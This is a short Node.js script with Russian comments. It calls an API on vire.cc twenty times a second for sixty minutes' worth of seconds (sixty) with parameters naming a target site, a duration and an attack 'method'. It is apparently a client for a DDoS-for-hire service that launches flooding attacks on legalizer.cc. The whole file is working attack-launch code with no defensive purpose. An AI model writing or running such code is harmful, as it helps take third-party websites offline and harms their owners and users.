const axios = require('axios');

const url = 'https://vire.cc/api/v1/start?user=ce58a816-a641-406f-a60f-b52119e81154&target=https://legalizer.cc&time=60&method=JS-ENGINE';
const frequency = 20; // Количество запросов в секунду
const interval = 1000 / frequency; // Интервал между запросами в миллисекундах

let intervalId = setInterval(async () => {
    try {
        const response = await axios.get(url);
        console.log('Response:', response.data);
    } catch (error) {
        console.error('Error details:', error.response ? error.response.data : error.message);
    }
}, interval);

// Остановка через 60 секунд
setTimeout(() => {
    clearInterval(intervalId);
    console.log('Stopped sending requests.');
}, 60000); // 60 секунд